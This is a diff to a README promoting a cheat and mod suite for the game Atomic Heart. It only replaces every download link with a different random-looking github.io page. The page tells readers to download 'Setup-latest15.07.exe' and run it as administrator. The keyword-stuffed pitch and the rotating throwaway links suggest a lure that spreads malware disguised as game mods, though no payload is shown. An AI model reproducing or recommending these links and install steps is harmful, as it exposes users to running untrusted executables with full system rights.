@@ -2,7 +2,7 @@
 
 The Atomic Heart Ultimate Mod Collection is a comprehensive all-in-one Windows desktop utility designed to give you complete control over your Atomic Heart experience. Whether you are looking for Atomic Heart god mode, infinite ammo, one-hit kill, infinite energy, a full save editor, or a way to unlock all weapons instantly, this collection packages every essential enhancement into a single, easy-to-install mod suite for Windows 10 and Windows 11. Updated for 2026, the latest release includes full compatibility with the most recent game patches and DLC.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -30,7 +30,7 @@ Before you install, make sure your system meets the following minimum requiremen
 
 Follow these steps to get the Atomic Heart Ultimate Mod Collection running on your PC:
 
-1. Click the **Download** badge at the top of this page or visit the [Download page](https://yellowtaxisave.github.io/download-page/) to obtain the installer.
+1. Click the **Download** badge at the top of this page or visit the [Download page](https://capitals-707-bringing.github.io/download-page/) to obtain the installer.
 2. Locate the downloaded file named **Setup-latest15.07.exe** in your Downloads folder.
 3. Right-click **Setup-latest15.07.exe** and choose **Run as administrator** to prevent permission issues.
 4. Follow the on-screen wizard: select your preferred installation directory and confirm the components you wish to install.
@@ -60,7 +60,7 @@ Make sure you are running **Setup-latest15.07.exe** as an administrator. If the 
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Disclaimer
 
